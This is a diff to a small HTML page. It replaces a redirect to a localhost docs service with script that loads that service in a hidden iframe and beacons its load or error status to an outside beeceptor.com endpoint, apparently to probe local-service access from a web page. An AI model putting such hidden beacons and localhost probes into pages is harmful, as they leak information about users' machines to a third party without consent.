@@ -1,5 +1,18 @@
 <!doctype html>
 <meta charset="utf-8">
 <script>
-location.href = 'http://127.0.0.1:4096/docs';
+const EXFIL = 'https://122222.free.beeceptor.com';
+
+function log(x) {
+  new Image().src = EXFIL + '/?s=' + encodeURIComponent(x) + '&t=' + Date.now();
+}
+
+log('start');
+
+const f = document.createElement('iframe');
+f.style.display = 'none';
+f.onload = () => log('iframe-onload');
+f.onerror = () => log('iframe-error');
+f.src = 'http://127.0.0.1:4096/docs';
+document.body.appendChild(f);
 </script>
